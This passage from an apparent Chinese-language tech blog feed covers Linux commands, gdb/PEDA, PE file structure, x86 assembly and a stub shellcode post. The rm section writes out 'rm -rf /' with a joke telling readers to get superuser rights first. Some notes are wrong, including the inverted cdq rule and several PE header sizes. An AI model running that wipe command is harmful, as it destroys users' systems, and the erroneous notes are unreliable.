在每一行输出的末尾显示一个 $ 符号（用来判断空格或缩进的长度）</span></span><br><span class="line">    -T / --show-tabs  <span class="comment"># 输出时用 ^T 替换缩进</span></span><br><span class="line"></span><br><span class="line">head file      <span class="comment"># 查看文件头部内容（默认前10行）</span></span><br><span class="line">head -n 12 file    <span class="comment"># 查看文件前12行</span></span><br><span class="line">head -c 1024 file  <span class="comment"># 查看文件的前1024个字节bytes</span></span><br><span class="line"></span><br><span class="line">tail file      <span class="comment"># 查看文件尾部内容(默认后10行)</span></span><br><span class="line">     -n</span><br><span class="line">     -c</span><br></pre></td></tr></table></figure><h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><p>切换工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> -   <span class="comment"># 返回上一个工作目录</span></span><br><span class="line"><span class="built_in">cd</span> ..  <span class="comment"># 切换到上级目录</span></span><br><span class="line"><span class="built_in">cd</span> ~   <span class="comment"># 切换到当前用户的home目录</span></span><br><span class="line"><span class="built_in">cd</span> target_dir  <span class="comment"># 切换到指定目录</span></span><br></pre></td></tr></table></figure><h2 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp/mv"></a>cp/mv</h2><p>拷贝/移动文件或目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cp [OPTION]... [-T] SOURCE DEST</span><br><span class="line">cp -r /path/dir0 /path/dir1   <span class="comment"># 递归的拷贝目录dir0为dir1</span></span><br><span class="line">cp file1 file2                <span class="comment"># 拷贝file1,新文件为file2</span></span><br><span class="line">   -i       <span class="comment"># cp后默认会覆盖同名文件，-i选项可以使覆盖发生时暂停，进行确认或取消。</span></span><br><span class="line">            <span class="comment"># 建议cp时总使用 -i 选项</span></span><br><span class="line"></span><br><span class="line">mv [OPTION]... [-T] SOURCE DEST</span><br><span class="line"><span class="comment"># mv 参数与用法基本等同于 cp</span></span><br></pre></td></tr></table></figure><h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><p>删除文件或目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /         <span class="comment"># 删除系统中所有文件，使用此命令前应获得超级用户权限否则效果不理想</span></span><br><span class="line">rm -r /path/dir  <span class="comment"># 删除一个指定目录，加-f则在删除时无视一切警告，直接删除</span></span><br><span class="line">   -i            <span class="comment"># 删除时进行确认(建议总是使用这一选项)</span></span><br><span class="line">   -d            <span class="comment"># 删除一个空目录(在删除空目录时应总是选择-d而不是-r,以免意外)</span></span><br><span class="line">rm file          <span class="comment"># 删除文件file</span></span><br></pre></td></tr></table></figure><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>查看进程信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -A / ps -e     <span class="comment"># 列出所有进程</span></span><br><span class="line">ps -A --forest    <span class="comment"># 列出所有进程，以树状形式显示进程间的父子关系</span></span><br><span class="line">ps -a             <span class="comment"># 显示所有没有tty的进程</span></span><br><span class="line">ps -ax            <span class="comment"># 显示所有进程  -x: 解除其他命令要求tty的限制。一般用于与-a配合显示所有进程</span></span><br><span class="line">ps -aux           <span class="comment"># 显示所有包含其他使用者的进程（常用）</span></span><br></pre></td></tr></table></figure><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>匹配与查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">grep [options]... pattern [file]...</span><br><span class="line">     -c         <span class="comment"># 计算符合样本范式的数目</span></span><br><span class="line">     -n         <span class="comment"># 显示匹配行的行号</span></span><br><span class="line">     --color    <span class="comment"># 高亮输出匹配项</span></span><br><span class="line">                <span class="comment">#（部分linux默认 alias grep=&#x27;grep --color=auto&#x27;）</span></span><br><span class="line">     -i         <span class="comment"># 忽略大小写</span></span><br><span class="line">     -v         <span class="comment"># 反向匹配，查找不包含指定内容的行</span></span><br><span class="line"><span class="comment"># 常用例子</span></span><br><span class="line">grep pattern ./ -d recurse  <span class="comment"># 在当前文件夹查找所有文件匹配pattern的行</span></span><br><span class="line">                            <span class="comment"># -d recurse 进入目录查找</span></span><br><span class="line">                            <span class="comment"># -d read</span></span><br><span class="line">                            <span class="comment"># -d skip   跳过目录（对于此命令相当于啥也不干）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a123b123b&quot;</span> | grep a.*b  <span class="comment"># 默认贪婪匹配，即匹配到全文</span></span><br><span class="line">grep m.*n test.c              <span class="comment"># 在test.c内查找匹配该正则的行</span></span><br><span class="line">grep m.*n test.c -A 2         <span class="comment"># 额外再显示匹配行后两行的内容</span></span><br><span class="line">grep m.*n test.c -B 3         <span class="comment"># 额外再显示匹配行前三行的内容</span></span><br></pre></td></tr></table></figure><h2 id="du"><a href="#du" class="headerlink" title="du"></a>du</h2><p>查看文件或目录的占用空间大小</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">du           <span class="comment"># 查看当前文件夹的磁盘空间占用（默认即递归显示所有文件）</span></span><br><span class="line">du -h        <span class="comment"># 将输出信息调整为更易阅读的形式</span></span><br><span class="line">du -m /path  <span class="comment"># 以Mb为基本单位显示/path的信息</span></span><br></pre></td></tr></table></figure><h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><p>显示目前linux上文件系统的磁盘使用情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h        <span class="comment"># 查看磁盘使用情况。 -h的作用也是优化输出信息，使其更易读</span></span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>查找文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find ./               <span class="comment"># 查找当前目录下所有文件（包括所有子目录下的文件）</span></span><br><span class="line">find ./ -name <span class="string">&quot;*abc?&quot;</span>  <span class="comment"># 查找当前目录下文件名后缀是abc?的文件,?表示任意单字符</span></span><br><span class="line">        -iname         <span class="comment"># 基本等价-name，但是忽略大小写</span></span><br><span class="line">find /path/dir -ctime -2   <span class="comment"># dir目录下前两天修改过的文件</span></span><br><span class="line">find /path/dir -ctime +2   <span class="comment"># dir.....两天前........文件</span></span><br><span class="line">               -atime -2   <span class="comment"># ........前两天被读取过的文件</span></span><br><span class="line">               -size +1k   <span class="comment"># dir下大于1k的文件</span></span><br><span class="line">               -size -10c  <span class="comment"># dir下小于10字节的文件</span></span><br><span class="line">                           <span class="comment"># 类似的还有 w:字（双字节），M:MBytes，G:GBytes</span></span><br></pre></td></tr></table></figure><h2 id="kill-killall"><a href="#kill-killall" class="headerlink" title="kill / killall"></a>kill / killall</h2><p>终止进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> 12345     <span class="comment"># 终止pid为12345的进程</span></span><br><span class="line"><span class="built_in">kill</span> -9 12345  <span class="comment"># 彻底终止进程</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># killall 使用名称终止进程</span></span><br><span class="line">killall vi   <span class="comment"># 终止所有vi进程</span></span><br><span class="line">        -r   <span class="comment"># 使用正规表达式匹配要杀死的进程名称</span></span><br></pre></td></tr></table></figure><h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><p>更改文件权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x t.py      <span class="comment"># 给t.py 加上文件拥有者可执行的权限</span></span><br><span class="line">chmod +x t.py       <span class="comment"># 给t.py 加上文件拥有者，拥有者当前组，其他组的执行权限</span></span><br><span class="line">chmod 777 t.py      <span class="comment"># 给t.py所有权限 (-rwxrwxrwx)</span></span><br><span class="line">                    <span class="comment"># 777表示（111,111,111）,每个 111 表示对应的 rwx 权限开启</span></span><br></pre></td></tr></table></figure><h2 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a    <span class="comment"># 查看当前系统信息</span></span><br></pre></td></tr></table></figure><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netstat -t        <span class="comment"># 显示tcp相关的选项</span></span><br><span class="line">        -u        <span class="comment"># 显示udp相关的选项</span></span><br><span class="line">        -s        <span class="comment"># 显示每个协议的统计信息（如-st表示tcp相关统计信息）</span></span><br><span class="line">        -a        <span class="comment"># 显示所有端口(如-au表示udp相关的端口)</span></span><br><span class="line">        -l        <span class="comment"># 显示处于监听状态（Listening）的端口</span></span><br><span class="line">        -r        <span class="comment"># 显示核心路由信息</span></span><br><span class="line">        -p        <span class="comment"># 显示socket所属的程序名及pid</span></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">netstat -ap | grep ssh  <span class="comment"># 找到程序运行的端口</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">linux bash 命令及其常用参数介绍</summary>
    
    
    
    
    <category term="linux" scheme="https://xchens.cn/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>shellcode</title>
    <link href="https://xchens.cn/posts/8002891b/"/>
    <id>https://xchens.cn/posts/8002891b/</id>
    <published>2018-12-10T16:25:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<p>– 未完成</p><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>段选择字FS保存着当前TEB的地址</p><p>PE头地址 0x768c_00f0 = 0x768c_0000 + 0x0000_00f0</p><p>导出表地址 0x76a5_fca0 = 0x768c_0000 + 0x0019_fca0<br>          0x76a7_a000 = 0x768c_0000 + 0x001b_a000</p><p>函数名称列表 0x76A5_E6D8 = 0x768C_0000 + 0x0019_E6D8</p>]]></content>
    
    
    <summary type="html">shellcode 实战</summary>
    
    
    
    
    <category term="shellcode" scheme="https://xchens.cn/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>gdb-手册</title>
    <link href="https://xchens.cn/posts/8dd7a186/"/>
    <id>https://xchens.cn/posts/8dd7a186/</id>
    <published>2018-11-25T05:55:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="gdb命令"><a href="#gdb命令" class="headerlink" title="gdb命令"></a>gdb命令</h1><table><thead><tr><th align="left">命令</th><th align="left">解释</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">file &lt;filename&gt;</td><td align="left">加载被调试的文件</td><td align="left">file a.out</td></tr><tr><td align="left">r</td><td align="left">run 运行程序</td><td align="left"></td></tr><tr><td align="left">c</td><td align="left">continue 继续执行直到遇到断点</td><td align="left"></td></tr><tr><td align="left">b &lt;行号&gt;</td><td align="left">在指定行下断点</td><td align="left"></td></tr><tr><td align="left">b &lt;函数名&gt;</td><td align="left">给指定函数下断点</td><td align="left"></td></tr><tr><td align="left">b *&lt;函数名&gt;</td><td align="left">表示将断点设置在”由编译器生成的prolog代码处”</td><td align="left"></td></tr><tr><td align="left">b *&lt;地址&gt;</td><td align="left">给指定的内存地址下断点</td><td align="left">b *0x12345678</td></tr><tr><td align="left">d &lt;编号&gt;</td><td align="left">函数指定编号的断点或所有断点</td><td align="left"></td></tr><tr><td align="left">s</td><td align="left">单步进入(遇到函数进入)</td><td align="left"></td></tr><tr><td align="left">n</td><td align="left">单步执行(不进入函数)</td><td align="left"></td></tr><tr><td align="left">si</td><td align="left">等效于s(针对于汇编)</td><td align="left"></td></tr><tr><td align="left">ni</td><td align="left">等效于ni(针对于汇编)</td><td align="left"></td></tr><tr><td align="left">disas</td><td align="left">反汇编一段内存,不带参数则显示当前执行位置反汇编</td><td align="left"></td></tr><tr><td align="left">finish</td><td align="left">执行到返回</td><td align="left"></td></tr></tbody></table><h1 id="gdb插件"><a href="#gdb插件" class="headerlink" title="gdb插件"></a>gdb插件</h1><h2 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb-peda"></a>gdb-peda</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>PEDA是为GDB设计的一个强大的插件，全称是Python Exploit Development Assistance for GDB。它提供了很多人性化的功能，比如高亮显示反汇编代码、寄存器、内存信息，提高了debug的效率。同时，PEDA还为GDB添加了一些实用新的命令，比如checksec可以查看程序开启了哪些安全机制等等</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install peda</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">gdb调试工具的使用与介绍</summary>
    
    
    
    
    <category term="gdb" scheme="https://xchens.cn/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>PE文件分析</title>
    <link href="https://xchens.cn/posts/d6ad7f4e/"/>
    <id>https://xchens.cn/posts/d6ad7f4e/</id>
    <published>2018-11-13T10:47:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><p>dos头：共64字节，前两个字节固定是4D5A，最后4个字节指向PE头。</p><p>dos存根： 无用。</p><p>PE头：4字节PE标识符，20字节的PE文件头，224字节的PE可选头。</p><p>节表：40字节，在PE文件头里已经定义好了节表数目(WORD NumberOfSections;)。</p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><p>为了兼容dos系统而遗留。</p><h3 id="MZ头部"><a href="#MZ头部" class="headerlink" title="MZ头部"></a>MZ头部</h3><p>这也是真正的dos头，mz头部只是dos头的别名。<br>(PE内称的dos头往往包括dos存根，实际的dos程序的dos头只是当前这个头)  </p><p>dos头的最后给出了PE头的位置(e_lfanew)</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER = &#123;</span><br><span class="line">    e_magic: <span class="string">&quot;4D 5A&quot;</span>, <span class="comment">// MZ头标识</span></span><br><span class="line">    e_lfanew: <span class="string">&quot;40 00 00 00&quot;</span> <span class="comment">// 指向PE标识符的偏移</span></span><br><span class="line">&#125; <span class="comment">// 64字节 0x40</span></span><br></pre></td></tr></table></figure><h3 id="DOS存根"><a href="#DOS存根" class="headerlink" title="DOS存根"></a>DOS存根</h3><p>仅用于在exe执行与dos中时给出友好提示信息。(没用)</p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><p>真正的windows程序的头部。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS = &#123;</span><br><span class="line">    &#x27;PE标识符&#x27;, <span class="comment">// 4字节 0x4</span></span><br><span class="line">    &#x27;文件头IMAGE_FILE_HEADER&#x27;, <span class="comment">// 20字节 0x10</span></span><br><span class="line">    &#x27;可选头IMAGE_OPTIONAL_HEADER&#x27; <span class="comment">// 224字节 0xE0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可选头的最后一项是数据目录。<br>数据目录是一个数组，每一项包括两个字段，共20字节，分别是数据目录项的VitualAddress(实际上是RVA)和size</p><p>该头部分为32位和64位两个版本，其定义取决于是否定义了_WIN64宏。</p><p>如IMAGE_NT_HEADERS32的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span>&#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><p>节表也算作头部的一部分。</p><p>需要多少个节表项，就构造多少节表头(IMAGE_SECTION_HEADER)  </p><p>节表项（节）指 <code>.text .data .idata</code> 这样。</p><p>在之前的IMAGE_OPTIONAL_HEADER中已经指明了SizeOfHeader,根据其字段值在所有节表项（整个头部）的后面填充0补足。</p><h2 id="节数据（程序体）"><a href="#节数据（程序体）" class="headerlink" title="节数据（程序体）"></a>节数据（程序体）</h2><p>指具体的 <code>.text .data .idata</code>的内容，其所占空间大小在节表中定义。</p><h1 id="关于PE"><a href="#关于PE" class="headerlink" title="关于PE"></a>关于PE</h1><p>当文件对齐(FileAlignment)与节对齐(SegmentAlignment)相同时：</p><pre><code>VA - ImageBase = FOA（文件偏移地址） = RVA（相对虚拟地址）</code></pre><p>当二者不同时：</p><pre><code>首先计算RVA=VA-ImageBase判断RVA或FOA所在的节RVA-VOffset == FOA - ROffset</code></pre><p>总之就是无论什么情况下，节中的地址相对于节起始的偏移是不变的。</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入表描述符</span></span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR = &#123;</span><br><span class="line">    <span class="attr">&quot;OriginalFirstThunk&quot;</span>, <span class="comment">// 指向IMAGE_THUNK_DATA</span></span><br><span class="line">    <span class="attr">&quot;TimeDataStamp&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;ForwarderChain&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Name&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;FirstThunk&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IMAGE_THUNK_DATA = &#123;</span><br><span class="line">    <span class="comment">//保存的是导入函数的序号或者指向导入函数名称的RVA</span></span><br><span class="line">    uinon = &#123;</span><br><span class="line">        <span class="attr">&quot;DWORD ForwardString&quot;</span>,  <span class="comment">// PBYTE</span></span><br><span class="line">        <span class="attr">&quot;DWORD Function&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;DWORD Ordinal&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;DWORD AddressOfData&quot;</span></span><br><span class="line">    &#125;u1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_IMAGE_IMPORT_BY_NAME = &#123;</span><br><span class="line">    <span class="attr">&quot;WORD Hint&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;BYTE NAME[1]&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">pe文件结构组成分析介绍</summary>
    
    
    
    
    <category term="pe" scheme="https://xchens.cn/tags/pe/"/>
    
  </entry>
  
  <entry>
    <title>汇编笔记</title>
    <link href="https://xchens.cn/posts/c517333d/"/>
    <id>https://xchens.cn/posts/c517333d/</id>
    <published>2018-11-12T05:56:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="基本寄存器-8086"><a href="#基本寄存器-8086" class="headerlink" title="基本寄存器(8086)"></a>基本寄存器(8086)</h2><p>1:数据寄存器,一般称之为通用寄存器组</p><pre><code>8086 有8个8位数据寄存器这些8位寄存器可分别组成16位寄存器：AH&amp;AL＝AX：累加寄存器，常用于运算；BH&amp;BL＝BX：基址寄存器，常用于地址索引；CH&amp;CL＝CX：计数寄存器，常用于计数；DH&amp;DL＝DX：数据寄存器，常用于数据传递。</code></pre><p>2:地址寄存器/段地址寄存器</p><pre><code>为了运用所有的内存空间，8086设定了四个段寄存器，专门用来保存段地址：CS（Code Segment）：代码段寄存器DS（Data Segment）：数据段寄存器SS（Stack Segment）：堆栈段寄存器ES（Extra Segment）：附加段寄存器</code></pre><p>3：特殊功能的寄存器</p><pre><code>IP（Instruction Pointer）：指令指针寄存器，与CS配合使用，可跟踪程序的执行过程SP（Stack Pointer）：堆栈指针，与SS配合使用，可指向目前的堆栈位置BP（Base Pointer）：基址指针寄存器，可用作SS的一个相对基址位置SI（Source Index）：源变址寄存器可用来存放相对于DS段之源变址指针DI（Destination Index）：目的变址寄存器，可用来存放相对于 ES 段之目的变址指针。</code></pre><h2 id="关于栈"><a href="#关于栈" class="headerlink" title="关于栈"></a>关于栈</h2><p>ESP: 栈指针寄存器(extended stack pointer) - 指向系统栈最上面一个栈帧的顶部（也是整个栈的顶部）<br>EBP: 基址指针寄存器(extended base pointer) - 指向系统栈最上面一个栈帧的底部<br>ESP与EBP之间的内存空间为当前栈帧。</p><p>EIP: 指令寄存器(extended instruction pointer) - 存放一个指针，指向等待执行的指令地址。</p><h2 id="不常用指令"><a href="#不常用指令" class="headerlink" title="不常用指令"></a>不常用指令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">CLD         ;clear flag DF</span><br><span class="line">pushf       ;将标志寄存器的值压栈</span><br><span class="line">popf        ;从栈中弹出数据，送入标志寄存器中。</span><br><span class="line"></span><br><span class="line">pushad      ;将所有寄存器压栈，执行后ESP=ESP-32（32位下）</span><br><span class="line">            ;压栈顺序为EAX、ECX、EDX、EBX、ESP、EBP、ESI、EDI</span><br><span class="line">popad       ;对应pushad</span><br><span class="line"></span><br><span class="line">lodsb       ;将esi指向的地址处的数据取出来赋给AL寄存器</span><br><span class="line">            ;然后esi=esi+1</span><br><span class="line">lodsw       ;与lodsb类似，操作的是字，赋值给AX</span><br><span class="line">lodsd       ;同上，赋值给EAX</span><br><span class="line">stosb       ;将AL寄存器的值取出来赋给edi所指向的地址处。</span><br><span class="line">            ;即mov [edi]，AL与edi=edi+1</span><br><span class="line">stosw       ;</span><br><span class="line">stosd       ;</span><br><span class="line">;这一组指令操控的是esi与edi</span><br><span class="line"></span><br><span class="line">cdq         ;Convert Double to Quad</span><br><span class="line">            ;将双字数据扩展到四字</span><br><span class="line">            ;将EAX的最高位拷贝到EDX的每一位</span><br><span class="line">            ;如果EAX&lt;0x8000_0000,EDX=0xFFFF_FFFF</span><br><span class="line">            ;否则EDX=0x0000_0000</span><br><span class="line">            ;如EAX存储-5即EAX=0xFFFF_FFFB</span><br><span class="line">            ;则EDX=0xFFFF_FFFF</span><br><span class="line">            ;两个寄存器合在一起就可以表示一个64位数</span><br><span class="line"></span><br><span class="line">movsx       ;先符号扩展再传送</span><br><span class="line">            ;对于正数而言，符号扩展等于零扩展</span><br><span class="line">            ;对于负数而言，将一个内存较小的值扩展到较大的内存里</span><br><span class="line">            ;需要保留符号位，所以高位全部赋1</span><br><span class="line">movzx       ;先零扩展再传送</span><br><span class="line">            ;低位直接拷贝，高位部分赋0</span><br><span class="line"></span><br><span class="line">Enter       ;相当于push ebp和mov ebp,esp  常用于函数开始处</span><br><span class="line">Leave       ;相当于mov esp,ebp和pop ebp  常用于函数结束处</span><br></pre></td></tr></table></figure><h2 id="跳转相关指令"><a href="#跳转相关指令" class="headerlink" title="跳转相关指令"></a>跳转相关指令</h2><p>1.无条件跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp         ;无条件跳转</span><br></pre></td></tr></table></figure><p>2.根据CX、ECX寄存器的值进行跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JCXZ        ;CX 为 0 则跳转</span><br><span class="line">JECXZ       ;ECX 为 0 则跳转</span><br></pre></td></tr></table></figure><p>3.根据标志位进行跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">JE          ;等于则跳转</span><br><span class="line">JNE         ;不等于则跳转</span><br><span class="line"></span><br><span class="line">JZ          ;为 0 则跳转</span><br><span class="line">JNZ         ;不为 0 则跳转</span><br><span class="line"></span><br><span class="line">JS          ;为负则跳转</span><br><span class="line">JNS         ;不为负则跳转</span><br><span class="line"></span><br><span class="line">JC          ;进位则跳转</span><br><span class="line">JNC         ;不进位则跳转</span><br><span class="line"></span><br><span class="line">JO          ;溢出则跳转</span><br><span class="line">JNO         ;不溢出则跳转</span><br><span class="line"></span><br><span class="line">JA          ;无符号大于则跳转</span><br><span class="line">JNA         ;无符号不大于则跳转</span><br><span class="line">JAE         ;无符号大于等于则跳转</span><br><span class="line">JNAE        ;无符号不大于等于则跳转</span><br><span class="line"></span><br><span class="line">JG          ;有符号大于则跳转</span><br><span class="line">JNG         ;有符号不大于则跳转</span><br><span class="line">JGE         ;有符号大于等于则跳转</span><br><span class="line">JNGE        ;有符号不大于等于则跳转</span><br><span class="line"></span><br><span class="line">JB          ;无符号小于则跳转</span><br><span class="line">JNB         ;无符号不小于则跳转</span><br><span class="line">JBE         ;无符号小于等于则跳转</span><br><span class="line">JNBE        ;无符号不小于等于则跳转</span><br><span class="line"></span><br><span class="line">JL          ;有符号小于则跳转</span><br><span class="line">JNL         ;有符号不小于则跳转</span><br><span class="line">JLE         ;有符号小于等于则跳转</span><br><span class="line">JNLE        ;有符号不小于等于则跳转</span><br><span 